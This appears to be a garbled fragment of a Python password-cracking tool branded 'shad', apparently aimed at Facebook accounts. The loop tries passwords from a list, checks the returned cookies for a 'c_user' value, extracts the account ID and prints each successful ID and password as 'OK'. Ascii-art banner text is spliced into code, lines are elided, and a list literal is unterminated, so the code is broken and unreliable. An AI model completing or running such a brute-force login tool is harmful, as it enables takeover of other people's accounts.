...
\033[1;92m/ ███████║██║  ██║██║     ██║██████╔╝
 ...
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mshad \033[1;92m           | 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio shad_OK.mp3")
                print('\033[1;92m[shad══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
                                ══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
                                -OK] '+uid+' | '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mshad","
        sys.stdout.write(f'\r    {P}[{animasi}{P}][{K}%s{P}/{B}%s{P}][{
                                H}OK{P}]{P}[{H}%s{P}] \r'%(loop,tl,len(ok))),
        sys.stdout.flush()
    except:
        pass
